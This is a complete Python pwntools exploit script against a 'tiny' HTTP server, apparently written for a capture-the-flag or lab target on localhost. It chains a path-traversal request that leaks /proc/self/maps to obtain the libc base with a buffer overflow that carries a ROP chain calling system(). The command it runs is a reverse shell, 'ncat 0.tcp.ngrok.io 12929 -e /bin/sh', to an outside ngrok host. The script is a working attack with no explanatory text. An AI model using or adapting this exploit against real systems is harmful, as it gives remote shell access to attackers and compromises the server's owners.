#!/usr/bin/python3
from pwn import *

import os
os.chdir(os.path.abspath(os.path.dirname(sys.argv[0])))

# ------- Load Bin ------- #
server_bin = './tiny'
e = ELF(server_bin, checksec=False)
r = ROP(e)

context.update(arch='amd64', os='linux', bits=64)

# ------------------------ #
port = 30627
host = '127.0.0.1'
# ------------------------ #

# Get Maps
maps_req = b"GET /%2f..%2f..%2f..%2fproc/self/maps HTTP1.1\nRange: bytes=0-10000\n\n"
p = remote(host, port)
p.send(maps_req)

maps = p.recvall().decode().split('\n')[6:][:-2]

for map in maps:
    print(map)

libc_base = int(maps[8].split("-")[0],16)

print(hex(libc_base))

l = ELF("libc.so.6", checksec=False)
l.address = libc_base
lr = ROP(l)

p = remote(host, port)

shell = b"/usr/bin/ncat 0.tcp.ngrok.io 12929 -e /bin/sh"
lr.read(4, l.bss(0), len(shell));
lr.system(l.bss(0))

inp = b"GET /empty%%" + b"A" * 579 + p64(lr.ret.address) + lr.chain() + b" HTTP1.1\n\n"

p.send(inp)
p.sendline(shell)

p.interactive()

p.close()

